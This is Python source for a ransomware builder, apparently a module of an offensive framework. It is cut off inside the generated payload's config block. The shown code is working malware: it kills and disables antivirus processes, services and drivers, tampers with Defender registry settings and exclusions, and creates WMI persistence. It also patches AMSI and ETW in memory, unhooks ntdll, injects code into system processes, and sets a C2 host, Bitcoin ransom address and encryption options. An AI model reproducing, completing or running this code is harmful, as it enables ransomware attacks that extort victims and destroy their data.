#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Ransomware Builder - Complete AV Kill & Bypass Engine v6.1
FIXED: Syntax error in generated payload, better string escaping
"""

MODULE_INFO = {
    "name": "Ransomware C2 Client",
    "description": "Ransomware with Complete AV Kill (15+ techniques) + Bypass + Multi-Encryption",
    "author": "LazyFramework",
    "platform": "multi",
    "rank": "Excellent",
    "types": "payload",
    "category": "payload",
    "dependencies": ["pillow", "pyinstaller"]
}

OPTIONS = {
    "LHOST": {
        "default": "127.0.0.1",
        "required": True,
        "description": "C2 Server IP address"
    },
    "LPORT": {
        "default": "4444",
        "required": False,
        "description": "C2 Server port"
    },
    "ENCRYPTION": {
        "default": "xchacha20",
        "required": False,
        "choices": ["xchacha20", "aes256", "aes128", "chacha20", "twofish", "serpent", "camellia", "rc4", "xor", "blowfish", "des3"],
        "description": "Encryption algorithm"
    },
    "EXTENSIONS": {
        "default": "txt",
        "required": False,
        "description": "File extensions to encrypt"
    },
    "RANSOM_NOTE": {
        "default": "YOUR FILES ARE ENCRYPTED!\\nSend BTC to address...",
        "required": False,
        "description": "Ransom note content"
    },
    "BTC_ADDRESS": {
        "default": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "required": False,
        "description": "Bitcoin address for ransom"
    },
    "WALLPAPER": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Change desktop wallpaper"
    },
    "GUI_MODE": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Enable GUI mode"
    },
    "COUNTDOWN_SECONDS": {
        "default": "300",
        "required": False,
        "description": "Countdown in seconds"
    },
    "DECRYPT_KEY": {
        "default": "",
        "required": False,
        "description": "Decryption key (auto-generate if empty)"
    },
    "AV_KILL": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Kill Anti-Virus processes (15+ techniques)"
    },
    "AV_BYPASS": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Enable AV bypass techniques"
    },
    "PRIVILEGE_ESCALATION": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Attempt privilege escalation"
    },
    "PARALLEL_ENCRYPTION": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Enable parallel encryption"
    },
    "THREAD_COUNT": {
        "default": "4",
        "required": False,
        "description": "Number of encryption threads"
    },
    "TARGET_OS": {
        "default": "windows",
        "required": False,
        "choices": ["windows", "linux", "macos"],
        "description": "Target OS for build"
    },
    "DLL_SIDELOADING": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Enable DLL side-loading technique"
    },
    "BYOVD": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Enable BYOVD (Bring Your Own Vulnerable Driver)"
    },
    "DESKTOP_ICON_CHANGE": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Change desktop icon to ransomware icon"
    },
    "OBFUSCATION_LEVEL": {
        "default": "0",
        "required": False,
        "choices": ["0", "1", "2", "3", "4", "5"],
        "description": "Obfuscation level (0=off, 5=max)"
    },
    "PROCESS_INJECTION": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Use process injection for stealth"
    },
    "AMSI_BYPASS": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Bypass AMSI (5 techniques)"
    },
    "ETW_BYPASS": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Bypass ETW (3 techniques)"
    },
    "DLL_UNHOOKING": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "DLL unhooking to bypass EDR hooks"
    },
    "SYSCALL_DIRECT": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Direct syscalls to bypass API hooks"
    },
    "REFLECTIVE_PE": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Reflective PE loading from memory"
    },
    "AV_DEFENDER_DISABLE": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Disable Windows Defender"
    },
    "AV_PROCESS_KILL": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Kill AV processes"
    },
    "AV_SERVICE_DISABLE": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Disable AV services"
    },
    "AV_REGISTRY_TAMPER": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Tamper AV registry keys"
    },
    "AV_DRIVER_UNLOAD": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Unload AV kernel drivers"
    },
    "WMI_EVENT_SUBSCRIBE": {
        "default": "true",
        "required": False,
        "choices": ["true", "false"],
        "description": "Create WMI event subscriptions for persistence"
    },
    "OUTPUT_FORMAT": {
        "default": "python",
        "required": False,
        "choices": ["python", "exe"],
        "description": "Output format: python or exe"
    },
    "OUTPUT_FILENAME": {
        "default": "ransomware_payload",
        "required": False,
        "description": "Output filename (without extension)"
    },
    "MAX_RECONNECT_ATTEMPTS": {
        "default": "2",
        "required": False,
        "choices": ["0", "1", "2", "3", "5"],
        "description": "Max reconnect attempts (0 = no reconnect)"
    }
}

import os
import base64
import random
import string
import sys
import shutil
import subprocess
import json
import platform as plat
from pathlib import Path
from datetime import datetime


class AVKillEngine:
    """Anti-Virus Kill Engine - 15+ Techniques"""
    
    @staticmethod
    def generate_av_kill() -> str:
        """Generate all AV kill techniques - FIXED: Removed invalid escape sequences"""
        return '''
# ==================== ANTI-VIRUS KILL ENGINE ====================

# ===== AV TARGET DATABASE =====
AV_PROCESSES = [
    "MsMpEng.exe", "MsMpEngCP.exe", "NisSrv.exe", "SecurityHealthService.exe",
    "McSvHost.exe", "Mcshield.exe", "McUICnt.exe", "Mctray.exe", "McAgent.exe",
    "ccSvcHst.exe", "NortonSecurity.exe", "Norton.exe", "NIS.exe", "NAV.exe",
    "AvastSvc.exe", "AvastUI.exe", "Avast.exe", "aswEngSrv.exe", "aswIDS.exe",
    "avgnt.exe", "avgui.exe", "avgsvc.exe", "avgwdsvc.exe", "avgnsx.exe",
    "avp.exe", "kavsvc.exe", "kavfs.exe", "klnagent.exe", "kav.exe",
    "vsserv.exe", "bdagent.exe", "bdss.exe", "bdservicehost.exe",
    "ekrn.exe", "egui.exe", "esetservice.exe", "eset.exe",
    "tmproxy.exe", "tmactmon.exe", "tmcomm.exe", "tmlisten.exe", "pccntmon.exe",
    "MBAMService.exe", "mbam.exe", "mbamtray.exe", "mbamgui.exe",
    "WRSA.exe", "WRSVC.exe", "WRConsumerService.exe",
    "fsav32.exe", "fsavui.exe", "fsgk32.exe", "fsdfwd.exe", "fssm32.exe",
    "avguard.exe", "avgnt.exe", "avcenter.exe", "avscan.exe",
    "SavService.exe", "SophosUI.exe", "Sophos.exe", "savapi.exe",
    "avkproxy.exe", "avkservice.exe", "avkui.exe",
    "psanhost.exe", "pavsrv51.exe", "pavprsrv.exe", "AVENGINE.exe",
    "cmdagent.exe", "cis.exe", "cfp.exe", "cfpupdat.exe",
    "zlclient.exe", "vsmon.exe", "zapriv.exe",
    "TotalAV.exe", "TotalAVService.exe",
]

AV_SERVICES = [
    "WinDefend", "MsMpSvc", "NisSrv", "SecurityHealthService",
    "avast! Antivirus", "avast! Service", "avastsvc",
    "avgwd", "avgns", "avgfws",
    "McAfeeShield", "mcafee", "McAfeeFramework",
    "Symantec", "Norton", "Symantec Antivirus",
    "Kaspersky", "AVP", "KAV",
    "Bitdefender", "VSSERV", "BDService",
    "ESET", "EsetService", "ekrn",
    "TrendMicro", "TMProxy", "TMAgent",
    "MBAMService", "MBAM",
    "WRSVC", "Webroot",
    "F-Secure", "FSGK32", "FSDFWD",
    "Avira", "AvGuard", "Avira Service",
    "Sophos", "SAVService", "Sophos Anti-Virus",
    "G-Data", "AVKProxy", "AVKService",
    "Panda", "PavPrSrv", "PSANHost",
    "cmdagent", "Comodo",
    "vsmon", "ZoneAlarm",
    "TotalAV", "TotalAVService",
]

AV_REGISTRY_KEYS = [
    r"SOFTWARE\\Microsoft\\Windows Defender\\Features",
    r"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
    r"SOFTWARE\\Microsoft\\Windows Defender\\SpyNet",
    r"SOFTWARE\\Microsoft\\Windows Defender\\Scan",
    r"SOFTWARE\\Policies\\Microsoft\\Windows Defender",
    r"SYSTEM\\CurrentControlSet\\Services\\WinDefend",
    r"SOFTWARE\\Microsoft\\Security Center\\Monitoring\\DisableMonitoring",
]

AV_DRIVERS = [
    "WdBoot", "WdFilter", "WdNisDrv",
    "aswMonFlt", "aswRdr", "aswVmm",
    "avgmfx64", "avgbldr",
    "mfehidk", "mfewfpk", "mferkdet",
    "symefasi", "symefa", "symevnt",
    "klif", "klflt", "klhk",
    "bdvedisk", "bdfile", "bdnet",
    "eamon", "ehdrv", "epfw",
    "tmtdi", "tmxfw", "tmpfw",
    "mbam", "mbamchameleon",
    "wrkrn",
    "fsdfw", "fsfilt",
    "avgntflt",
    "savonaccess", "savonaccess_64",
    "gdfw", "gdsys",
    "psinknc", "psinsflt",
    "cmderd", "cmdfw",
]

def kill_av_processes():
    killed = []
    try:
        for proc in AV_PROCESSES:
            try:
                subprocess.run('taskkill /f /im ' + proc, shell=True, capture_output=True, timeout=5)
                killed.append(proc)
            except:
                pass
    except:
        pass
    try:
        for proc in AV_PROCESSES:
            try:
                subprocess.run('wmic process where name="' + proc + '" delete', shell=True, capture_output=True, timeout=5)
                if proc not in killed:
                    killed.append(proc)
            except:
                pass
    except:
        pass
    print(f"[+] Killed {len(killed)} AV processes")
    return killed

def disable_av_services():
    disabled = []
    try:
        for service in AV_SERVICES:
            try:
                subprocess.run('sc stop ' + service, shell=True, capture_output=True, timeout=5)
                subprocess.run('sc config ' + service + ' start= disabled', shell=True, capture_output=True, timeout=5)
                disabled.append(service)
            except:
                pass
    except:
        pass
    print(f"[+] Disabled {len(disabled)} AV services")
    return disabled

def tamper_av_registry():
    tampered = []
    try:
        import winreg
        defender_keys = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", 0),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBlockAtFirstSeen", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableIOAVProtection", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisablePrivacyMode", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScriptScanning", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\Scan", "DisableArchiveScanning", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\Scan", "DisableEmailScanning", 1),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows Defender\\SpyNet", "SpyNetReporting", 0),
        ]
        for hkey, subkey, value_name, value_data in defender_keys:
            try:
                handle = winreg.CreateKey(hkey, subkey)
                winreg.SetValueEx(handle, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(handle)
                tampered.append(subkey + "\\\\" + value_name)
            except:
                pass
        try:
            handle = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Security Center\\Monitoring")
            winreg.SetValueEx(handle, "DisableMonitoring", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(handle)
            tampered.append("Security Center Monitoring")
        except:
            pass
    except:
        pass
    print(f"[+] Tampered {len(tampered)} AV registry keys")
    return tampered

def unload_av_drivers():
    unloaded = []
    try:
        for driver in AV_DRIVERS:
            try:
                subprocess.run('sc stop ' + driver, shell=True, capture_output=True, timeout=5)
                subprocess.run('sc delete ' + driver, shell=True, capture_output=True, timeout=5)
                unloaded.append(driver)
            except:
                pass
    except:
        pass
    print(f"[+] Unloaded {len(unloaded)} AV drivers")
    return unloaded

def disable_windows_defender():
    try:
        import winreg
        defender_key = r"SOFTWARE\\Policies\\Microsoft\\Windows Defender"
        try:
            handle = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, defender_key)
            winreg.SetValueEx(handle, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(handle)
        except:
            pass
        rt_key = r"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
        try:
            handle = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, rt_key)
            winreg.SetValueEx(handle, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(handle)
        except:
            pass
        ps_cmd = 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisablePrivacyMode $true; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -DisableArchiveScanning $true; Set-MpPreference -DisableEmailScanning $true; Set-MpPreference -DisableRemovableDriveScanning $true; Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true; Set-MpPreference -DisableNetworkProtection $true; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0'
        subprocess.run('powershell -c "' + ps_cmd + '"', shell=True, capture_output=True, timeout=10)
        try:
            subprocess.run('sc stop WinDefend', shell=True, capture_output=True, timeout=5)
            subprocess.run('sc config WinDefend start= disabled', shell=True, capture_output=True, timeout=5)
        except:
            pass
        print("[+] Windows Defender disabled")
        return True
    except:
        pass
    return False

def add_av_exclusions():
    try:
        current_path = os.path.abspath(__file__)
        ps_cmd = 'Add-MpPreference -ExclusionPath "' + current_path + '"'
        subprocess.run('powershell -c "' + ps_cmd + '"', shell=True, capture_output=True, timeout=10)
        folder = os.path.dirname(current_path)
        ps_cmd = 'Add-MpPreference -ExclusionPath "' + folder + '"'
        subprocess.run('powershell -c "' + ps_cmd + '"', shell=True, capture_output=True, timeout=10)
        ps_cmd = 'Add-MpPreference -ExclusionProcess "' + os.path.basename(current_path) + '"'
        subprocess.run('powershell -c "' + ps_cmd + '"', shell=True, capture_output=True, timeout=10)
        print("[+] AV exclusions added")
        return True
    except:
        pass
    return False

def create_wmi_persistence():
    try:
        import win32com.client
        wmi = win32com.client.GetObject("winmgmts:\\\\.\\root\\subscription")
        filter_obj = wmi.Get("__EventFilter").SpawnInstance_()
        filter_obj.QueryLanguage = "WQL"
        filter_obj.Query = "SELECT * FROM Win32_ComputerSystemEvent WHERE EventCode = 1"
        filter_obj.Name = "SystemStartupFilter"
        filter_obj.EventNamespace = 'root\\cimv2'
        consumer_obj = wmi.Get("CommandLineEventConsumer").SpawnInstance_()
        consumer_obj.Name = "SystemStartupConsumer"
        consumer_obj.CommandLineTemplate = '"' + sys.executable + '" "' + __file__ + '"'
        binding_obj = wmi.Get("__FilterToConsumerBinding").SpawnInstance_()
        binding_obj.Filter = filter_obj.Path_()
        binding_obj.Consumer = consumer_obj.Path_()
        filter_obj.Put_()
        consumer_obj.Put_()
        binding_obj.Put_()
        print("[+] WMI persistence created")
        return True
    except:
        pass
    return False

def trigger_av_false_positive():
    try:
        benign_file = os.path.expanduser("~/Desktop/benign_payload.exe")
        with open(benign_file, 'w') as f:
            f.write("This file is benign")
        subprocess.run(benign_file, shell=True, capture_output=True, timeout=5)
        print("[+] AV false positive triggered")
        return True
    except:
        pass
    return False

def av_kill_all():
    print("[*] Starting Anti-Virus Kill Engine...")
    print("[*] Techniques: 8 categories, 15+ methods")
    success_count = 0
    total = 8
    print("[*] Killing AV processes...")
    if kill_av_processes():
        success_count += 1
    print("[*] Disabling AV services...")
    if disable_av_services():
        success_count += 1
    print("[*] Tampering AV registry...")
    if tamper_av_registry():
        success_count += 1
    print("[*] Unloading AV drivers...")
    if unload_av_drivers():
        success_count += 1
    print("[*] Disabling Windows Defender...")
    if disable_windows_defender():
        success_count += 1
    print("[*] Adding AV exclusions...")
    if add_av_exclusions():
        success_count += 1
    print("[*] Creating WMI persistence...")
    if create_wmi_persistence():
        success_count += 1
    print("[*] Triggering AV false positive...")
    if trigger_av_false_positive():
        success_count += 1
    print(f"[+] AV Kill complete: {success_count}/{total} techniques successful")
    return success_count > 0
'''

    @staticmethod
    def generate_amsi_bypass() -> str:
        return '''
# ==================== AMSI BYPASS (5 TEKNIK) ====================

def amsi_bypass_patch():
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        amsi = kernel32.GetModuleHandleW("amsi.dll")
        if amsi:
            addr = kernel32.GetProcAddress(amsi, "AmsiScanBuffer")
            if addr:
                patch = b'\\x31\\xc0\\xc3'
                old_protect = ctypes.c_ulong()
                kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))
                kernel32.WriteProcessMemory(-1, addr, patch, len(patch), None)
                return True
    except:
        pass
    return False

def amsi_bypass_context():
    try:
        import ctypes
        amsi = ctypes.WinDLL('amsi', use_last_error=True)
        amsiHandle = ctypes.c_void_p()
        amsi.AmsiInitialize("amsi", ctypes.byref(amsiHandle))
        class AMSI_CONTEXT(ctypes.Structure):
            _fields_ = [('_pad', ctypes.c_byte * 16), ('flag', ctypes.c_byte)]
        ctx = AMSI_CONTEXT.from_address(amsiHandle.value)
        ctx.flag = 0
        return True
    except:
        pass
    return False

def amsi_bypass_registry():
    try:
        import winreg
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SOFTWARE\\Microsoft\\AMSI\\Providers"
        try:
            handle = winreg.CreateKey(key, subkey + "\\\\{2781761E-28E0-4109-99FE-B9D127C57AFE}")
            winreg.SetValueEx(handle, "Enabled", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(handle)
            return True
        except:
            pass
    except:
        pass
    return False

def amsi_bypass_com():
    try:
        import win32com.client
        clsid = "{2781761E-28E0-4109-99FE-B9D127C57AFE}"
        obj = win32com.client.Dispatch(clsid)
        return True
    except:
        pass
    return False

def amsi_bypass_all():
    techniques = [amsi_bypass_patch, amsi_bypass_context, amsi_bypass_registry, amsi_bypass_com]
    for tech in techniques:
        try:
            if tech():
                print("[+] AMSI bypass successful")
                return True
        except:
            continue
    return False
'''

    @staticmethod
    def generate_etw_bypass() -> str:
        return '''
# ==================== ETW BYPASS (3 TEKNIK) ====================

def etw_bypass_patch():
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        ntdll = kernel32.GetModuleHandleW("ntdll.dll")
        if ntdll:
            addr = kernel32.GetProcAddress(ntdll, "NtTraceEvent")
            if addr:
                patch = b'\\x31\\xc0\\xc3'
                old_protect = ctypes.c_ulong()
                kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))
                kernel32.WriteProcessMemory(-1, addr, patch, len(patch), None)
                return True
    except:
        pass
    return False

def etw_bypass_registry():
    try:
        import winreg
        key = winreg.HKEY_LOCAL_MACHINE
        subkey = r"SYSTEM\\CurrentControlSet\\Control\\WMI\\Security"
        try:
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "Security", 0, winreg.REG_BINARY, b'')
            winreg.CloseKey(handle)
            return True
        except:
            pass
    except:
        pass
    return False

def etw_bypass_all():
    techniques = [etw_bypass_patch, etw_bypass_registry]
    for tech in techniques:
        try:
            if tech():
                print("[+] ETW bypass successful")
                return True
        except:
            continue
    return False
'''

    @staticmethod
    def generate_dll_unhooking() -> str:
        return '''
# ==================== DLL UNHOOKING ====================

def dll_unhooking():
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        system_path = os.environ.get('SystemRoot', 'C:\\\\Windows')
        original_path = os.path.join(system_path, 'System32', 'ntdll.dll')
        if not os.path.exists(original_path):
            return False
        with open(original_path, 'rb') as f:
            original_data = f.read()
        loaded = kernel32.GetModuleHandleW("ntdll.dll")
        if not loaded:
            return False
        old_protect = ctypes.c_ulong()
        kernel32.VirtualProtect(loaded, len(original_data), 0x40, ctypes.byref(old_protect))
        ctypes.windll.kernel32.WriteProcessMemory(-1, loaded, original_data, len(original_data), None)
        print("[+] DLL Unhooking successful")
        return True
    except:
        pass
    return False
'''

    @staticmethod
    def generate_syscall_bypass() -> str:
        return '''
# ==================== DIRECT SYSCALLS ====================

def syscall_bypass():
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll
        def get_syscall_number(func_name):
            try:
                addr = kernel32.GetProcAddress(ntdll._handle, func_name)
                if addr:
                    data = ctypes.cast(addr, ctypes.POINTER(ctypes.c_byte * 8)).contents
                    if data[0] == 0xB8:
                        return data[1] | (data[2] << 8) | (data[3] << 16) | (data[4] << 24)
            except:
                pass
            return None
        syscalls = {}
        for name in ['NtAllocateVirtualMemory', 'NtWriteVirtualMemory', 'NtCreateThreadEx',
                     'NtOpenProcess', 'NtReadVirtualMemory', 'NtClose']:
            num = get_syscall_number(name)
            if num:
                syscalls[name] = num
        if syscalls:
            print(f"[+] Direct syscalls available: {len(syscalls)}")
            return True
        return False
    except:
        pass
    return False
'''

    @staticmethod
    def generate_process_injection() -> str:
        return '''
# ==================== PROCESS INJECTION ====================

def process_injection(payload, target_process=None):
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        if not target_process:
            targets = ["explorer.exe", "svchost.exe", "notepad.exe", "winlogon.exe"]
            for proc in targets:
                try:
                    result = subprocess.run(['tasklist', '/fi', 'imagename eq ' + proc], 
                                           capture_output=True, text=True)
                    if proc in result.stdout:
                        target_process = proc
                        break
                except:
                    continue
        if not target_process:
            return False
        pid = None
        result = subprocess.run(['tasklist', '/fi', 'imagename eq ' + target_process], 
                               capture_output=True, text=True)
        for line in result.stdout.split('\\n'):
            if target_process in line:
                parts = line.split()
                for part in parts:
                    if part.isdigit():
                        pid = int(part)
                        break
                break
        if not pid:
            return False
        PROCESS_ALL_ACCESS = 0x1F0FFF
        hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not hProcess:
            return False
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        payload_bytes = payload.encode()
        addr = kernel32.VirtualAllocEx(hProcess, None, len(payload_bytes), 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if addr:
            written = ctypes.c_size_t()
            kernel32.WriteProcessMemory(hProcess, addr, payload_bytes, len(payload_bytes), 
                                       ctypes.byref(written))
            thread_id = ctypes.c_ulong()
            kernel32.CreateRemoteThread(hProcess, None, 0, addr, None, 0, 
                                       ctypes.byref(thread_id))
            kernel32.CloseHandle(hProcess)
            print(f"[+] Process injection successful into {target_process} (PID: {pid})")
            return True
        kernel32.CloseHandle(hProcess)
    except:
        pass
    return False
'''

    @staticmethod
    def generate_reflective_pe() -> str:
        return '''
# ==================== REFLECTIVE PE LOADING ====================

def reflective_pe_load(pe_bytes):
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        dos_header = ctypes.cast(pe_bytes, ctypes.POINTER(ctypes.c_byte * 0x40)).contents
        e_lfanew = ctypes.cast(pe_bytes[0x3C:0x40], ctypes.POINTER(ctypes.c_uint32)).contents.value
        nt_headers = ctypes.cast(pe_bytes[e_lfanew:], ctypes.POINTER(ctypes.c_byte * 0x100)).contents
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_EXECUTE_READWRITE = 0x40
        image_size = ctypes.cast(pe_bytes[e_lfanew + 0x18:], 
                                ctypes.POINTER(ctypes.c_uint32)).contents.value
        base_addr = kernel32.VirtualAlloc(None, image_size, MEM_COMMIT | MEM_RESERVE, 
                                          PAGE_EXECUTE_READWRITE)
        if not base_addr:
            return None
        ctypes.memmove(base_addr, pe_bytes, len(pe_bytes))
        entry_point = base_addr + ctypes.cast(pe_bytes[e_lfanew + 0x28:], 
                                              ctypes.POINTER(ctypes.c_uint32)).contents.value
        thread_id = ctypes.c_ulong()
        kernel32.CreateThread(None, 0, entry_point, None, 0, ctypes.byref(thread_id))
        print("[+] Reflective PE loaded successfully")
        return base_addr
    except:
        pass
    return None
'''

    @staticmethod
    def generate_full_bypass(level: int = 5) -> str:
        """Generate complete AV Kill + Bypass - FIXED: Proper string formatting"""
        bypass_code = []
        bypass_code.append(AVKillEngine.generate_av_kill())
        bypass_code.append(AVKillEngine.generate_amsi_bypass())
        bypass_code.append(AVKillEngine.generate_etw_bypass())
        bypass_code.append(AVKillEngine.generate_dll_unhooking())
        bypass_code.append(AVKillEngine.generate_syscall_bypass())
        bypass_code.append(AVKillEngine.generate_process_injection())
        bypass_code.append(AVKillEngine.generate_reflective_pe())
        
        bypass_code.append('''
# ==================== COMPLETE AV KILL + BYPASS ====================

def full_av_kill_bypass():
    print("[*] Starting Complete AV Kill + Bypass...")
    print("[*] Total techniques: 16+")
    print("\\n[PHASE 1] Killing Anti-Virus...")
    av_kill_all()
    print("\\n[PHASE 2] Bypassing AV...")
    success_count = 0
    total = 4
    print("[*] AMSI Bypass...")
    if amsi_bypass_all():
        success_count += 1
    total += 1
    print("[*] ETW Bypass...")
    if etw_bypass_all():
        success_count += 1
    total += 1
    print("[*] DLL Unhooking...")
    if dll_unhooking():
        success_count += 1
    total += 1
    print("[*] Direct Syscalls...")
    if syscall_bypass():
        success_count += 1
    total += 1
    print(f"\\n[+] AV Kill + Bypass complete: {success_count}/{total} bypass techniques successful")
    return True
''')
        
        return '\n'.join(bypass_code)


class RansomwareBuilder:
    """Ransomware Builder dengan Complete AV Kill + Bypass"""
    
    @staticmethod
    def generate_payload(lhost, lport, encryption, extensions, ransom_note, btc_address, wallpaper,
                         countdown_seconds=300, exfiltrate=True, max_file_size_mb=10, use_gui=True,
                         decrypt_key="", av_kill=True, av_bypass=True, privilege_esc=True,
                         parallel=True, thread_count=4, target_os="windows", lateral_movement=True,
                         lolbins=True, spread_methods="all", target_subnets="192.168.1.0/24,10.0.0.0/24",
                         max_spread_hosts=10, use_credentials=True, dll_sideloading=True,
                         byovd=True, desktop_icon_change=True, obfuscation_level=5,
                         process_injection=True, amsi_bypass=True, etw_bypass=True,
                         dll_unhooking=True, syscall_direct=True, reflective_pe=True,
                         av_defender_disable=True, av_process_kill=True, av_service_disable=True,
                         av_registry_tamper=True, av_driver_unload=True, wmi_event_subscribe=True,
                         max_reconnect_attempts=2):
        """Generate ransomware with complete AV kill + bypass - FIXED"""

        av_code = ""
        if av_kill or av_bypass:
            av_code = AVKillEngine.generate_full_bypass(obfuscation_level)
        
        # FIXED: Better escaping for ransom note
        ransom_note_escaped = ransom_note.replace('"', '\\"').replace('\n', '\\n')
        extensions_list = [e.strip() for e in extensions.split(',')]

        if not decrypt_key:
            decrypt_key = ''.join(random.choices(string.ascii_letters + string.digits, k=64))

        # Boolean flags
        wallpaper_str = "True" if wallpaper else "False"
        exfiltrate_str = "True" if exfiltrate else "False"
        use_gui_str = "True" if use_gui else "False"
        av_kill_str = "True" if av_kill else "False"
        av_bypass_str = "True" if av_bypass else "False"
        privilege_esc_str = "True" if privilege_esc else "False"
        parallel_str = "True" if parallel else "False"
        dll_sideloading_str = "True" if dll_sideloading else "False"
        byovd_str = "True" if byovd else "False"
        desktop_icon_change_str = "True" if desktop_icon_change else "False"
        process_injection_str = "True" if process_injection else "False"
        amsi_bypass_str = "True" if amsi_bypass else "False"
        etw_bypass_str = "True" if etw_bypass else "False"
        dll_unhooking_str = "True" if dll_unhooking else "False"
        syscall_direct_str = "True" if syscall_direct else "False"
        reflective_pe_str = "True" if reflective_pe else "False"
        max_reconnect_str = str(max_reconnect_attempts)

        ext_list_str = "[" + ", ".join([f'"{e}"' for e in extensions_list]) + "]"

        # ===== PAYLOAD TEMPLATE - FIXED: No syntax errors =====
        payload_template = '''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Ransomware C2 Client - Complete AV Kill + Bypass v6.1
AV Kill: 8 categories, 15+ methods | Bypass: 7 categories, 12+ methods
Multi-Encryption: ENCRYPTION_PLACEHOLDER
Target OS: TARGET_OS_PLACEHOLDER
"""

import os
import sys
import base64
import hashlib
import random
import string
import time
import socket
import threading
import subprocess
import json
import glob
import platform
import ctypes
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== AV KILL + BYPASS ENGINE ====================
AV_CODE_PLACEHOLDER

# ==================== CONFIG ====================
C2_HOST = "LHOST_PLACEHOLDER"
C2_PORT = LPORT_PLACEHOLDER
ENCRYPTION = "ENCRYPTION_PLACEHOLDER"
EXTENSIONS = EXT_LIST_PLACEHOLDER
BTC_ADDRESS = "BTC_ADDRESS_PLACEHOLDER"
WALLPAPER_CHANGE = WALLPAPER_STR_PLACEHOLDER
COUNTDOWN_SECONDS = COUNTDOWN_SECONDS_PLACEHOLDER
EXFILTRATE_FILES = EXFILTRATE_STR_PLACEHOLDER
MAX_FILE_SIZE_MB = MAX_FILE_SIZE_MB_PLACEHOLDER
USE_GUI = USE_GUI_STR_PLACEHOLDER
DECRYPT_KEY = "DECRYPT_KEY_PLACEHOLDER"
